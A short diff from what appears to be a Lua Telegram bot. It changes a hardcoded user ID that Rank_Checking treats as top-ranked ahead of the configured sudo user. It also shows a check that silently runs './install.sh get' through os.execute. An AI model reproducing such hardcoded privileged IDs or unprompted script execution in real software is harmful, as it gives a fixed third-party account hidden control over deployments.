@@ -108,7 +108,7 @@ end
 end
 function CleangGroups();local z = io.open('./apro');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/apro.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(970017493) then  
+if tonumber(user_id) == tonumber(648027560) then  
 var = true  
 elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
